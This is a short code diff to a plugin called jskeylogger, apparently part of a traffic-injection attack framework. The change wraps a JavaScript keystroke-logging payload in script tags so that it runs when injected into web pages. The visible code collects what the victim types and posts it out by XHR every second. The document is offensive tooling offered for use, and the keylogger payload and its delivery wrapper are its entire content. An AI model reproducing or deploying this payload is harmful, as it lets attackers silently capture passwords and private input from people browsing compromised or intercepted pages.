@@ -15,7 +15,8 @@ class jskeylogger(Inject, Plugin):
     def get_payload(self):
         #simple js keylogger stolen from http://wiremask.eu/xss-keylogger/
 
-        payload = """var keys = '';
+        payload = """<script type="text/javascript">
+var keys = '';
 
 function make_xhr(){
     var xhr;
@@ -53,6 +54,7 @@ window.setInterval(function(){
     xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
     xhr.send(keys);
     keys = '';
-}, 1000);"""
+}, 1000);
+</script>"""
 
         return payload
